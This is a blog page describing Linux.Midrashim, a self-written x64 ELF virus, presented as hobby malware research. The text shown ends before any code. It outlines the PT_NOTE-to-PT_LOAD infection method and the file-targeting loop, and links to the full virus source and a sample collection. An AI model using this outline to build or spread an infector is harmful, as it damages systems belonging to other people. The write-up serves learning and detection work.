<!DOCTYPE html>
<html lang="en-US">
  <head>
    



    <meta name="generator" content="Hugo 0.54.0">
    <meta charset="utf-8">
    <script src="https://use.fontawesome.com/0ae8a400c3.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Linux.Midrashim: Assembly x64 ELF virus | TMZ Lair - Underground Coding</title>
    <meta name="description" content="PT_NOTE -&gt; PT_LOAD x64 ELF virus written in Assembly">
    <meta name="keywords" content="virus, linux, elf, infector, assembly, malware, x64, asm, midrashim, ozar, injection, vx">
    
    
    
    
    <meta property="og:title" content="Linux.Midrashim: Assembly x64 ELF virus" />
<meta property="og:description" content="PT_NOTE -&gt; PT_LOAD x64 ELF virus written in Assembly" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.guitmz.com/linux-midrashim-elf-virus/" />

<meta property="og:image" content="https://i.imgur.com/DHt6Czb.jpg" />
<meta property="article:published_time" content="2021-01-18T21:01:11&#43;02:00"/>
<meta property="article:modified_time" content="2021-01-18T21:01:11&#43;02:00"/>

    <meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://i.imgur.com/DHt6Czb.jpg"/>

<meta name="twitter:title" content="Linux.Midrashim: Assembly x64 ELF virus"/>
<meta name="twitter:description" content="PT_NOTE -&gt; PT_LOAD x64 ELF virus written in Assembly"/>

    




    

    
    
  <meta name="referrer" content="same-origin">


    
    
    <script integrity="sha512-2t0yyNrUdtn9WGIoBVxq5vtoJQYfoDQDbqRPpOb75f1hiL39DGLdJKDrGP60fBhXfrFeKyVhzWJvHvLgln/ElA==">/*! Fetch Inject v2.0.4 | Copyright (C) Josh Habdas <jhabdas@protonmail.com> (https://habd.as) | @license Zlib */
var fetchInject=function(){"use strict";const e=function(e,t,r,n,o,c,i){c=t.createElement(r),i=t.getElementsByTagName(r)[0],c.appendChild(t.createTextNode(n.text)),c.onload=o(n),i?i.parentNode.insertBefore(c,i):t.head.appendChild(c)};return function(t,r){if(!arguments.length)return Promise.reject(new ReferenceError("Failed to execute 'fetchInject': 1 argument required but only 0 present."));if(arguments[0]&&arguments[0].constructor!==Array)return Promise.reject(new TypeError("Failed to execute 'fetchInject': argument 1 must be of type 'Array'."));if(arguments[1]&&arguments[1].constructor!==Promise)return Promise.reject(new TypeError("Failed to execute 'fetchInject': argument 2 must be of type 'Promise'."));const n=[],o=r?[].concat(r):[],c=[];return t.forEach(e=>o.push(window.fetch(e).then(e=>[e.clone().text(),e.blob()]).then(e=>Promise.all(e).then(e=>{n.push({text:e[0],blob:e[1]})})))),Promise.all(o).then(()=>(n.forEach(t=>{c.push({then:r=>{t.blob.type.includes("text/css")?e(window,document,"style",t,r):e(window,document,"script",t,r)}})}),Promise.all(c)))}}();
</script>
    <script integrity="sha512-hno7WeTIciCJSjg/myjyK30HYkrcGCVwo4g4SpUalvrs3r2lS7bPNIQwbCNypKbg7BZ1sA4AsGnk6Gq4NOKpGA==">fetchInject(["/js/lazysizes.min.js"]);
</script>
    



    
    <link rel="canonical" href="https://www.guitmz.com/linux-midrashim-elf-virus/">
    
    
    <link rel="icon" sizes="any" href="data:image/svg+xml,%3Csvg%20viewBox='0%200%2046%2045'%20xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EAfter%20Dark%3C/title%3E%3Cpath%20d='M.708%2045L23%20.416%2045.292%2045H.708zM35%2038L23%2019%2011%2038h24z'%20fill='lime'/%3E%3C/svg%3E">

    

  
  
  
  
  
  
  
    
      
        <style>html{font-size:12px}*{box-sizing:border-box;text-rendering:geometricPrecision}body{font-size:1rem;line-height:1.5rem;margin:0;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif;word-wrap:break-word}h1,h2,h3,h4,h5,h6{line-height:1.3em}fieldset{border:none;padding:0;margin:0}pre{padding:2rem;margin:1.75rem 0;background-color:#fff;border:1px solid #ccc;overflow:auto}code[class*=language-],pre[class*=language-],pre code{font-weight:100;text-shadow:none;margin:1.75rem 0}a{cursor:pointer;color:#43a047;text-decoration:none;border-bottom:1px solid #43a047}a:hover{background-color:#43a047;color:#fff}.grid{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap}.grid.\-top{-ms-flex-align:start;align-items:flex-start}.grid.\-middle{-ms-flex-align:center;align-items:center}.grid.\-bottom{-ms-flex-align:end;align-items:flex-end}.grid.\-stretch{-ms-flex-align:stretch;align-items:stretch}.grid.\-baseline{-ms-flex-align:baseline;align-items:baseline}.grid.\-left{-ms-flex-pack:start;justify-content:flex-start}.grid.\-center{-ms-flex-pack:center;justify-content:center}.grid.\-right{-ms-flex-pack:end;justify-content:flex-end}.grid.\-between{-ms-flex-pack:justify;justify-content:space-between}.grid.\-around{-ms-flex-pack:distribute;justify-content:space-around}.cell{-ms-flex:1;flex:1;box-sizing:border-box}@media screen and (min-width:768px){.cell.\-1of12{-ms-flex:0 0 8.33333%;flex:0 0 8.33333%}.cell.\-2of12{-ms-flex:0 0 16.66667%;flex:0 0 16.66667%}.cell.\-3of12{-ms-flex:0 0 25%;flex:0 0 25%}.cell.\-4of12{-ms-flex:0 0 33.33333%;flex:0 0 33.33333%}.cell.\-5of12{-ms-flex:0 0 41.66667%;flex:0 0 41.66667%}.cell.\-6of12{-ms-flex:0 0 50%;flex:0 0 50%}.cell.\-7of12{-ms-flex:0 0 58.33333%;flex:0 0 58.33333%}.cell.\-8of12{-ms-flex:0 0 66.66667%;flex:0 0 66.66667%}.cell.\-9of12{-ms-flex:0 0 75%;flex:0 0 75%}.cell.\-10of12{-ms-flex:0 0 83.33333%;flex:0 0 83.33333%}.cell.\-11of12{-ms-flex:0 0 91.66667%;flex:0 0 91.66667%}}@media screen and (max-width:768px){.grid{-ms-flex-direction:column;flex-direction:column}.cell{-ms-flex:0 0 auto;flex:0 0 auto}}.hack,.hack blockquote,.hack code,.hack em,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack strong{font-size:1rem;font-style:normal;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif}.hack blockquote,.hack code,.hack em,.hack strong{line-height:20px}.hack blockquote,.hack code,.hack footer,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack header,.hack li,.hack ol,.hack p,.hack section,.hack ul{float:none;margin:0;padding:0}.hack blockquote,.hack h1,.hack ol,.hack p,.hack ul{margin-top:20px;margin-bottom:20px}.hack h1{position:relative;display:inline-block;display:table-cell;padding:20px 0 30px;margin:0;overflow:hidden}.hack h1:after{content:"====================================================================================================";position:absolute;bottom:10px;left:0}.hack h1+*{margin-top:0}.hack h2,.hack h3,.hack h4,.hack h5,.hack h6{position:relative;margin-bottom:1.75rem}.hack h2:before,.hack h3:before,.hack h4:before,.hack h5:before,.hack h6:before{display:inline}.hack h2:before{content:"## "}.hack h3:before{content:"### "}.hack h4:before{content:"#### "}.hack h5:before{content:"##### "}.hack h6:before{content:"###### "}.hack li{position:relative;display:block;padding-left:20px}.hack li:after{position:absolute;top:0;left:0}.hack ul>li:after{content:"-"}.hack ol{counter-reset:a}.hack ol>li:after{content:counter(a) ".";counter-increment:a}.hack ol li:nth-child(n+10):after{left:-7px}.hack blockquote{position:relative;padding-left:17px;padding-left:2ch;overflow:hidden}.hack blockquote:after{content:">\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>";white-space:pre;position:absolute;top:0;left:0;line-height:20px}.hack em:after,.hack em:before{content:"*";display:inline}.hack pre code:after,.hack pre code:before{content:""}.hack code{font-weight:700}.hack code:after,.hack code:before{content:"`";display:inline}.hack hr{position:relative;height:20px;overflow:hidden;border:0;margin:20px 0}.hack hr:after{content:"----------------------------------------------------------------------------------------------------";position:absolute;top:0;left:0;line-height:20px;width:100%;word-wrap:break-word}@-moz-document url-prefix(){.hack h1{display:block}}.hack-ones ol>li:after{content:"1."}p{margin:0 0 1.75rem}.container{max-width:70rem}.container,.container-fluid{margin:0 auto;padding:0 1rem}.inner{padding:1rem}.inner2x{padding:2rem}.pull-left{float:left}.pull-right{float:right}.progress-bar{height:8px;opacity:.8;background-color:#ccc;margin-top:12px}.progress-bar.progress-bar-show-percent{margin-top:38px}.progress-bar-filled{background-color:gray;height:100%;transition:width .3s ease;position:relative;width:0}.progress-bar-filled:before{content:"";border:6px solid transparent;border-top-color:gray;position:absolute;top:-12px;right:-6px}.progress-bar-filled:after{color:gray;content:attr(data-filled);display:block;font-size:12px;white-space:nowrap;position:absolute;border:6px solid transparent;top:-38px;right:0;-ms-transform:translateX(50%);transform:translateX(50%)}table{width:100%;border-collapse:collapse;margin:1.75rem 0;color:#778087}table td,table th{vertical-align:top;border:1px solid #ccc;line-height:15px;padding:10px}table thead th{font-size:10px}table tbody td:first-child{font-weight:700;color:#333}.form{width:30rem}.form-group{margin-bottom:1.75rem;overflow:auto}.form-group label{border-bottom:2px solid #ccc;color:#333;width:10rem;display:inline-block;height:38px;line-height:38px;padding:0;float:left;position:relative}.form-group.form-success label{color:#4caf50!important;border-color:#4caf50!important}.form-group.form-warning label{color:#ff9800!important;border-color:#ff9800!important}.form-group.form-error label{color:#f44336!important;border-color:#f44336!important}.form-control{outline:none;border:none;border-bottom:2px solid #ccc;padding:.5rem 0;width:20rem;height:38px;background-color:transparent}.form-control:focus{border-color:#555}.form-group.form-textarea label:after{position:absolute;content:"";width:2px;background-color:#fff;right:-2px;top:0;bottom:0}textarea.form-control{height:auto;resize:none;padding:1rem 0;border-bottom:2px solid #ccc;border-left:2px solid #ccc;padding:.5rem}select.form-control{border-radius:0;background-color:transparent;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none}.help-block{color:#999;margin-top:.5rem}.form-actions{margin-bottom:1.75rem}.btn{display:-ms-inline-flexbox;display:inline-flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;cursor:pointer;outline:none;padding:.65rem 2rem;font-size:1rem;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;z-index:1}.btn:active{box-shadow:inset 0 1px 3px rgba(0,0,0,.12)}.btn.btn-ghost{border-color:#757575;color:#757575;background-color:transparent}.btn.btn-ghost:focus,.btn.btn-ghost:hover{border-color:#424242;color:#424242;z-index:2}.btn.btn-ghost:hover{background-color:transparent}.btn-block{width:100%;display:-ms-flexbox;display:flex}.btn-default{color:#fff;background-color:#e0e0e0;border:1px solid #e0e0e0;color:#333}.btn-default:focus:not(.btn-ghost),.btn-default:hover{background-color:#dcdcdc;border-color:#dcdcdc}.btn-success{color:#fff;background-color:#4caf50;border:1px solid #4caf50}.btn-success:focus:not(.btn-ghost),.btn-success:hover{background-color:#43a047;border-color:#43a047}.btn-success.btn-ghost{border-color:#4caf50;color:#4caf50}.btn-success.btn-ghost:focus,.btn-success.btn-ghost:hover{border-color:#388e3c;color:#388e3c;z-index:2}.btn-error{color:#fff;background-color:#f44336;border:1px solid #f44336}.btn-error:focus:not(.btn-ghost),.btn-error:hover{background-color:#e53935;border-color:#e53935}.btn-error.btn-ghost{border-color:#f44336;color:#f44336}.btn-error.btn-ghost:focus,.btn-error.btn-ghost:hover{border-color:#d32f2f;color:#d32f2f;z-index:2}.btn-warning{color:#fff;background-color:#ff9800;border:1px solid #ff9800}.btn-warning:focus:not(.btn-ghost),.btn-warning:hover{background-color:#fb8c00;border-color:#fb8c00}.btn-warning.btn-ghost{border-color:#ff9800;color:#ff9800}.btn-warning.btn-ghost:focus,.btn-warning.btn-ghost:hover{border-color:#f57c00;color:#f57c00;z-index:2}.btn-info{color:#fff;background-color:#00bcd4;border:1px solid #00bcd4}.btn-info:focus:not(.btn-ghost),.btn-info:hover{background-color:#00acc1;border-color:#00acc1}.btn-info.btn-ghost{border-color:#00bcd4;color:#00bcd4}.btn-info.btn-ghost:focus,.btn-info.btn-ghost:hover{border-color:#0097a7;color:#0097a7;z-index:2}.btn-primary{color:#fff;background-color:#2196f3;border:1px solid #2196f3}.btn-primary:focus:not(.btn-ghost),.btn-primary:hover{background-color:#1e88e5;border-color:#1e88e5}.btn-primary.btn-ghost{border-color:#2196f3;color:#2196f3}.btn-primary.btn-ghost:focus,.btn-primary.btn-ghost:hover{border-color:#1976d2;color:#1976d2;z-index:2}.btn-group{overflow:auto}.btn-group .btn{float:left}.btn-group .btn-ghost:not(:first-child){margin-left:-1px}.card{border:1px solid #ccc}.card .card-header{color:#333;text-align:center;background-color:#ddd;padding:.5rem 0}.alert{color:#ccc;padding:1rem;border:1px solid #ccc;margin-bottom:1.75rem}.alert-success{color:#4caf50;border-color:#4caf50}.alert-error{color:#f44336;border-color:#f44336}.alert-info{color:#00bcd4;border-color:#00bcd4}.alert-warning{color:#ff9800;border-color:#ff9800}.media:not(:last-child){margin-bottom:1.25rem}.media-left{padding-right:1rem}.media-left,.media-right{display:table-cell;vertical-align:top}.media-right{padding-left:1rem}.media-body{display:table-cell;vertical-align:top}.media-heading{font-size:1.16667rem;font-weight:700}.media-content{margin-top:.3rem}.avatarholder,.placeholder{background-color:#f0f0f0;text-align:center;color:#b9b9b9;font-size:1rem;border:1px solid #f0f0f0}.avatarholder{width:48px;height:48px;line-height:46px;font-size:2rem;background-size:cover;background-position:50%;background-repeat:no-repeat}.avatarholder.rounded{border-radius:33px}.loading{display:inline-block;content:"&nbsp;";height:20px;width:20px;margin:0 .5rem;animation:a .6s infinite linear;border:2px solid #e91e63;border-right-color:transparent;border-radius:50%}.btn .loading{margin-bottom:0;width:14px;height:14px}.btn div.loading{float:left}.alert .loading{margin-bottom:-5px}@keyframes a{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.menu{width:100%}.menu .menu-item{display:block;color:#616161;border-color:#616161}.menu .menu-item.active,.menu .menu-item:hover{color:#000;border-color:#000;background-color:transparent}@media screen and (max-width:768px){.form-group label{display:block;border-bottom:none;width:100%}.form-group.form-textarea label:after{display:none}.form-control{width:100%}textarea.form-control{border-left:none;padding:.5rem 0}pre::-webkit-scrollbar{height:3px}}@media screen and (max-width:480px){.form{width:100%}}
.dark-grey{background-color:#181818;color:#ccc}.dark-grey pre{background-color:#181818;padding:0;border:none}.dark-grey pre code{color:#00bcd4}.dark-grey h1 a,.dark-grey h2 a,.dark-grey h3 a,.dark-grey h4 a,.dark-grey h5 a{color:#ccc}.dark-grey code,.dark-grey strong{color:#fff}.dark-grey code{font-weight:100}.dark-grey table{color:#ccc}.dark-grey table td,.dark-grey table th{border-color:#444}.dark-grey table tbody td:first-child{color:#fff}.dark-grey .form-group label{color:#ccc;border-color:rgba(95,95,95,.78)}.dark-grey .form-group.form-textarea label:after{background-color:#181818}.dark-grey .form-control{color:#ccc;border-color:rgba(95,95,95,.78)}.dark-grey .form-control:focus{border-color:#ccc;color:#ccc}.dark-grey textarea.form-control{color:#ccc}.dark-grey .card{border-color:rgba(95,95,95,.78)}.dark-grey .card .card-header{background-color:transparent;color:#ccc;border-bottom:1px solid rgba(95,95,95,.78)}.dark-grey .btn.btn-ghost.btn-default{border-color:#ababab;color:#ababab}.dark-grey .btn.btn-ghost.btn-default:focus,.dark-grey .btn.btn-ghost.btn-default:hover{border-color:#9c9c9c;color:#9c9c9c;z-index:1}.dark-grey .btn.btn-ghost.btn-default:focus,.dark-grey .btn.btn-ghost.btn-default:hover{border-color:#e0e0e0;color:#e0e0e0}.dark-grey .btn.btn-ghost.btn-primary:focus,.dark-grey .btn.btn-ghost.btn-primary:hover{border-color:#64b5f6;color:#64b5f6}.dark-grey .btn.btn-ghost.btn-success:focus,.dark-grey .btn.btn-ghost.btn-success:hover{border-color:#81c784;color:#81c784}.dark-grey .btn.btn-ghost.btn-info:focus,.dark-grey .btn.btn-ghost.btn-info:hover{border-color:#4dd0e1;color:#4dd0e1}.dark-grey .btn.btn-ghost.btn-error:focus,.dark-grey .btn.btn-ghost.btn-error:hover{border-color:#e57373;color:#e57373}.dark-grey .btn.btn-ghost.btn-warning:focus,.dark-grey .btn.btn-ghost.btn-warning:hover{border-color:#ffb74d;color:#ffb74d}.dark-grey .avatarholder,.dark-grey .placeholder{background-color:transparent;border-color:#333}.dark-grey .menu .menu-item{color:#ccc;border-color:rgba(95,95,95,.78)}.dark-grey .menu .menu-item.active,.dark-grey .menu .menu-item:hover{color:#fff;border-color:#ccc}:root{scroll-behavior:smooth;--screen-size-small: 30em}@keyframes intro{0%{opacity:0}100%{opacity:1}}.blur-up{-webkit-filter:blur(5px);filter:blur(5px);transition:filter 400ms,-webkit-filter 400ms}.blur-up.lazyloaded{-webkit-filter:blur(0);filter:blur(0)}.hack .readmore{margin-bottom:2.2em}.responsive-iframe{position:relative;padding-bottom:56.25%;padding-top:25px;height:0}.responsive-iframe iframe{position:absolute;top:0;left:0;width:100%;height:100%}iframe{border:0}main,footer{animation:intro .3s both;animation-delay:.15s}header:first-of-type+details{margin-top:1rem}footer time[datetime$=M]:before{content:"\2013\0020"}body>footer p.muted{margin-bottom:0}@media only screen and (max-width:768px){footer time[datetime$=M]{display:none}}blockquote cite{display:block}blockquote cite::before{content:"\2014\00A0"}:target{filter:brightness(1.2)}:disabled{cursor:not-allowed}#search-app [v-cloak]{display:none}.hack li ul{margin:0}.hack ol li{padding-left:27px}.main{padding:20px 10px}input.form-control{border-radius:0;background-color:transparent;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none}input.form-control,textarea.form-control,select.form-control,.help-block{font-size:initial}@media only screen and (max-width:768px){.help-block{font-size:unset}}html{font-size:13px}.hack .form input,.hack .form textarea,.hack .form button,.hack .form label{font-size:1rem}.hack .alert .highlight:first-of-type .chroma,.hack .card .highlight:first-of-type .chroma{margin-top:unset}.hack .alert .highlight:last-of-type .chroma,.hack .card .highlight:last-of-type .chroma{margin-bottom:unset}.hack blockquote,.hack blockquote:after{line-height:1.5}.hack figure{margin:unset}.hack figure a{border-bottom:none}.hack figure a:hover{background-color:inherit}article [itemprop=description]{margin-bottom:20px;margin-top:20px}article header img{width:100%;border-radius:3px}table td,table th{line-height:inherit}table a{border-bottom:unset}img{max-width:100%}@media only screen and (min-width:768px){html{font-size:16px;margin-left:calc(100vw - 100%)}.container{max-width:50rem}}a[rel*="external"]::after {
  content: " " url("data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20class='i-external'%20viewBox='0%200%2032%2032'%20width='14'%20height='14'%20fill='none'%20stroke='%23ff9800'%20stroke-linecap='round'%20stroke-linejoin='round'%20stroke-width='9.38%'%3E%3Cpath%20d='M14%209%20L3%209%203%2029%2023%2029%2023%2018%20M18%204%20L28%204%2028%2014%20M28%204%20L14%2018'/%3E%3C/svg%3E");
}
nav a.active {
  background-color: #43a047;
  color: #fff;
}
a[itemprop="url"] {
  color: #ff9800;
}
a[itemprop="url"]:hover {
  color: #fff;
}
.muted, .help-block {
  opacity: 0.70;
}
.hack .muted,
.hack .help-block {
  color: #e0e0e0;
}

ul.social-icons {
  float: right;
  margin: 0;
  padding: 0;
  margin-block-start: 1em;
  margin-block-end: 1em;
  margin-inline-start: 0px;
  margin-inline-end: 0px;
  padding-inline-start: 40px;
  text-align: center;
  padding-top: 15px;
}

li.social-icons {
  display: inline-block;
  margin: 0 5px;
  list-style-type: circle;
}

a.social-icons {
  border-bottom: 0px;
  background-color: transparent;
  color: #ccc;
}

.highlight,pre.highlight{background:#282c34;color:#abb2bf}.highlight pre{background:#282c34;padding:1em;border:1px solid #ddd;background-color:#181818;box-shadow:5px 5px 5px #306734;}.highlight .ge{font-style:italic}.highlight .gs{font-weight:700}.highlight .ow{font-weight:700}.highlight .n,.highlight .nf,.highlight .nn,.highlight .o,.highlight .p{color:#abb2bf}.highlight .c,.highlight .c1,.highlight .cm,.highlight .cp,.highlight .cs{color:#5c6370;font-style:italic}.highlight .sr,.highlight .ss{color:#56b6c2}.highlight .k,.highlight .kc,.highlight .kd,.highlight .kn,.highlight .kp,.highlight .kr,.highlight .kt{color:#c678dd}.highlight .l,.highlight .ld,.highlight .s,.highlight .s1,.highlight .s2,.highlight .sb,.highlight .sc,.highlight .sd,.highlight .se,.highlight .sh,.highlight .si,.highlight .sx{color:#98c379}.highlight .nt,.highlight .nx,.highlight .vi{color:#e06c75}.highlight .il,.highlight .m,.highlight .mf,.highlight .mh,.highlight .mi,.highlight .mo,.highlight .na{color:#d19a66}.highlight .bp,.highlight .nb,.highlight .nc,.highlight .nd,.highlight .ne,.highlight .ni,.highlight .nl,.highlight .no,.highlight .nv,.highlight .py,.highlight .vc,.highlight .vg{color:#e5c07b}.highlight .err{color:#fff;background-color:#e05252}.highlight .gd{color:#e05252}.highlight .gi{color:#43d08a}.highlight .w{color:#f8f8f2}.highlight .cpf{color:#4146ff}.highlight .gu{color:#75715e}.highlight .lineno{color:#636d83;user-select:none}.highlight .hll{color:#abb2bf;background-color:#2c313a}.highlight .language-json .w+.s2{color:#e06c75}.highlight .language-json .kc{color:#56b6c2}
</style>
        


  
    <meta name="theme-color" content=#181818>
  



      
    
  


    
    
      <script integrity="sha512-ISTAV0GadOIz/NXXHOS+eCM0ysXVVHhQTlvA6LJxz/DeA5yIxm0Vqf5IE+WH0yuuXkayAKtoZkQ326nch5f/fg==">fetchInject(["/css/syntax.css"]);</script>
      <noscript>
        <link href="/css/syntax.css" rel="stylesheet">
      </noscript>
    
  <script defer src="https://cloud.umami.is/script.js" data-website-id="feb30b03-aca1-4123-bc8f-e832ee3e425b"></script></head>
  
  
  
  <body class="dark dark-grey main container">
    <ul class="social-icons">
	<li class="social-icons"><a href="http://twitter.com/share?url=https%3a%2f%2fwww.guitmz.com%2flinux-midrashim-elf-virus%2f&text=Linux.Midrashim%3a%20Assembly%20x64%20ELF%20virus%20" target="_blank" class="social-icons"><i class="fa fa-twitter fa-lg"></i></a></li>
	<li class="social-icons"><a href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fwww.guitmz.com%2flinux-midrashim-elf-virus%2f" class="social-icons" target="_blank"><i class="fa fa-facebook fa-lg"></i></a></li>
	<li class="social-icons"><a href="http://reddit.com/submit?url=https%3a%2f%2fwww.guitmz.com%2flinux-midrashim-elf-virus%2f&amp;title=Linux.Midrashim%3a%20Assembly%20x64%20ELF%20virus" class="social-icons" target="_blank"><i class="fa fa-reddit-alien fa-lg"></i></a></li>
	<li class="social-icons"><a href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fwww.guitmz.com%2flinux-midrashim-elf-virus%2f&amp;t=Linux.Midrashim%3a%20Assembly%20x64%20ELF%20virus" class="social-icons" target="_blank"><i class="fa fa-hacker-news fa-lg"></i></a></li>
	<li class="social-icons"><a href="http://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fwww.guitmz.com%2flinux-midrashim-elf-virus%2f&amp;title=Linux.Midrashim%3a%20Assembly%20x64%20ELF%20virus" class="social-icons" target="_blank"><i class="fa fa-linkedin fa-lg"></i></a></li>
	<li class="social-icons"><a href="mailto:?Subject=Linux.Midrashim%3a%20Assembly%20x64%20ELF%20virus&amp;Body=https%3a%2f%2fwww.guitmz.com%2flinux-midrashim-elf-virus%2f" class="social-icons" target="_blank"><i class="fa fa-envelope-o fa-lg"></i></a></li>
</ul>

    <header>
  

  
    
      
  <nav itemscope itemtype="https://schema.org/SiteNavigationElement">
    <meta itemprop="name" content="Main Menu">
    
      
      
        <a itemprop="url" href="/">Home</a>
      
    
      
      
        <a itemprop="url" class="active" href="/post/">Posts</a>
      
    
      
      
        <a itemprop="url" href="/about/">About</a>
      
    
      
      
        <a itemprop="url" href="/search/">Search</a>
      
    
  </nav>


    
  


</header>
    <main>
  <article itemscope itemtype="https://schema.org/BlogPosting">
    
<meta itemprop="name" content="Linux.Midrashim: Assembly x64 ELF virus">
<meta itemprop="description" content="PT_NOTE -&gt; PT_LOAD x64 ELF virus written in Assembly">


<meta itemprop="datePublished" content="2021-01-18T21:01:11&#43;02:00" />
<meta itemprop="dateModified" content="2021-01-18T21:01:11&#43;02:00" />
<meta itemprop="wordCount" content="3094">

  <meta itemprop="image" content="https://i.imgur.com/DHt6Czb.jpg">



<meta itemprop="keywords" content="virus,linux,elf,infector,assembly,malware,x64,asm,midrashim,ozar,injection,vx," />

    <header>
      <h1 itemprop="headline name">Linux.Midrashim: Assembly x64 ELF virus</h1>
      <p class="muted">
        <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
  <circle cx="16" cy="16" r="14" />
  <path d="M16 8 L16 16 20 20" />
</svg>
<span>15 minute read</span>
<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
</svg>

  Published: <time datetime="2021-01-18T21:01:11&#43;02:00">18 Jan, 2021</time>


      </p>
      
        <blockquote itemprop="description">PT_NOTE -&gt; PT_LOAD x64 ELF virus written in Assembly</blockquote>
      
      
    </header>
    
  <details>
    <summary>Table of Contents</summary>
    <nav id="TableOfContents">
<ul>
<li>
<ul>
<li><a href="#overview">Overview</a></li>
<li><a href="#how-it-works">How it works</a></li>
<li><a href="#code">Code</a>
<ul>
<li><a href="#the-secret-of-getting-ahead-is-getting-started">The secret of getting ahead is getting started</a></li>
<li><a href="#the-wild-hunt">The Wild Hunt</a></li>
<li><a href="#reproductive-system-101">Reproductive System 101</a></li>
<li><a href="#those-who-don-t-jump-will-never-fly">Those who don&rsquo;t jump will never fly</a></li>
<li><a href="#payload-s-on-the-way">Payload&rsquo;s on the way</a></li>
</ul></li>
<li><a href="#demo">Demo</a></li>
<li><a href="#outro">Outro</a></li>
</ul></li>
</ul>
</nav>
  </details>


    <div itemprop="articleBody">
      
      

<h2 id="overview">Overview</h2>

<p>My interest in <em>Assembly</em> language started when I was a kid, mainly because of computer viruses of the <code>DOS</code> era. I&rsquo;ve spent countless hours contemplating my first humble collection of source codes and samples (you can find it at <a href="https://github.com/guitmz/virii">https://github.com/guitmz/virii</a>) and to me, it&rsquo;s cool how flexible and creative one can get with <em>Assembly</em>, even if its learning curve is steep.</p>

<p>I&rsquo;m an independant malware researcher and wrote this virus to learn and have fun, expanding my knowledge on the several <em>ELF</em> attack/defense techniques and <em>Assembly</em> in general.</p>

<p>The code does not implement any evasion techniques and detection is trivial. Samples were also shared with a few major Antivirus companies prior to the release of this code and signatures were created, such as <code>Linux/Midrashim.A</code> by <a href="https://www.eset.com/">ESET</a>. I&rsquo;m also working on a <em>vaccine</em> which will be available at a later date. I&rsquo;ll update this post when it&rsquo;s ready.</p>

<p>The payload is not destructive, as usual. It just prints the harmless lyrics of <a href="https://legacyofkain.fandom.com/wiki/Ozar_Midrashim">Ozar Midrashim</a> song to <code>stdout</code> and the layout of an infected file is the following (<a href="https://i.imgur.com/h4PVnL1.png">full image</a>):</p>

<p style="text-align:center;">
<img
  data-sizes="auto"
  data-src="https://i.imgur.com/h4PVnL1.png"
  data-srcset="https://i.imgur.com/h4PVnL1.png 1500w"
  class="lazyload"
/>
</p>

<h2 id="how-it-works">How it works</h2>

<p><code>Midrashim</code> is a <em>64 bits</em> Linux infector that targets ELF files in the current directory (non recursively). It relies on the well known <code>PT_NOTE -&gt; PT_LOAD</code> infection technique and should work on regular and <a href="https://access.redhat.com/blogs/766093/posts/1975793">position independent</a> binaries. This method has a high success rate and it&rsquo;s easy to implement (and detect). Read more about it <a href="https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/">here</a>.</p>

<p>It will not work on <code>Golang</code> executables, because those need the <code>PT_NOTE</code> segment to run properly (infection works, but infected file will segfault after virus execution).</p>

<p>For simplicity&rsquo;s sake, it makes use of <a href="https://linux.die.net/man/2/pread64">pread64</a> and <a href="https://linux.die.net/man/2/pwrite64">pwrite64</a> to read/write specific locations in the target file when it should use <a href="https://man7.org/linux/man-pages/man2/mmap.2.html">mmap</a> instead, for flexibility and reliability. A few other things could be improved too, like detecting first virus execution with a better approach and more error handling to minimize pitfalls.</p>

<p>I had so many ideas for the payload of Midrashim, from inspiration I got from projects at <a href="http://www.pouet.net/">http://www.pouet.net/</a> to controlling the terminal with ANSI escape codes (more on that <a href="https://www.guitmz.com/having-fun-with-ansi-codes-and-x64-linux-assembly/">here</a> - which is something I wrote with Midrashim in mind).</p>

<p>Due to lack of free time and given the complexity of implementing such things in Assembly, specially in a code of this nature, I ended up with something simpler and will probably revisit this subject on a future project.</p>

<h2 id="code">Code</h2>

<p>This is my first full assembly infector and should be assembled with <a href="https://flatassembler.net/">FASM</a> x64. Its core functionality consists of:</p>

<ul>
<li>Reserving space on stack to store values in memory</li>
<li>Checking if its virus first run (displays a different payload message if running for the first time)</li>
<li>Open current directory for reading</li>
<li>Loop through files in the directory, checking for targets for infection</li>
<li>Try to infect target file</li>
<li>Continue looping the directory until no more infection targets are available, then exit</li>
</ul>

<p>Full code with comments is available at <a href="https://github.com/guitmz/midrashim">https://github.com/guitmz/midrashim</a> and we&rsquo;ll now go over each step above with a bit more detail.</p>

